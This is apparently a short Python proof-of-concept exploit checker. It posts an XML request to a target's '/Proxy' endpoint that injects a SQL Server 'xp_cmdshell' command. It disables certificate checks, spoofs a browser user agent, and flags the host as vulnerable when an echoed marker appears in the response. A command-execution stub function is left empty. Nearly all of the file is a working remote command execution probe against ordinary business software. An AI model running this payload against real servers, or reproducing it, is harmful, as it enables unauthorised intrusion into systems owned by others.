import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

headers = {
	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36 Edg/84.0.522.58',
	'Accept':'Accept: */*',
	'Content-Type':'application/x-www-form-urlencoded',
	'Connection':'Keep-Alive'
}

payload = """cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">exec xp_cmdshell 'echo 7969676569776f6c696769616f'</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>"""

def exp_check(url):

    try:
        r = requests.post(url+"/Proxy",data=payload,verify= False,timeout=5)
        
        if r"7969676569776f6c696769616f" in r.text:
            return 1
        return 2
    except:
        return 3


def exp_cmd(url,cmd):
    pass

